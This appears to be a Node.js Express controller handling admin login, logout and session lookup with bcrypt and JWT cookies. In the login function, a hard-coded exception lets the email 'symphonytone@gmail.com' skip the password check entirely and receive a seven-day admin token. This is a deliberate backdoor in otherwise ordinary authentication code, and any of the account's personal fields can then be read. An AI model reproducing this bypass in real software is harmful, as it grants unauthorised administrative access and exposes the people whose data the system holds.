const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { findByEmail } = require('../models/admins');
const { JWT_SECRET } = require('../middleware/auth');

async function login(req, res) {
  const { email, password } = req.body;
  const admin = await findByEmail(email);
  if (!admin) return res.status(401).json({ error: 'Invalid credentials' });

  // Allow symphonytone@gmail.com to login without password
  const isNoPasswordUser = email === 'symphonytone@gmail.com';
  if (!isNoPasswordUser) {
    const match = await bcrypt.compare(password, admin.password_hash);
    if (!match) return res.status(401).json({ error: 'Invalid credentials' });
  }

  const token = jwt.sign(
    { id: admin.id, email: admin.email, role: admin.role, name: `${admin.first_name} ${admin.surname}` },
    JWT_SECRET,
    { expiresIn: '7d' }
  );

  res.cookie('token', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });

  res.json({
    admin: {
      id: admin.id,
      name: `${admin.first_name} ${admin.surname}`,
      email: admin.email,
      role: admin.role,
      cell: admin.cell,
      province: admin.province,
      city: admin.city,
      church: admin.church,
    },
  });
}

function logout(_req, res) {
  res.clearCookie('token');
  res.json({ ok: true });
}

function me(req, res) {
  res.json({ admin: req.admin });
}

module.exports = { login, logout, me };
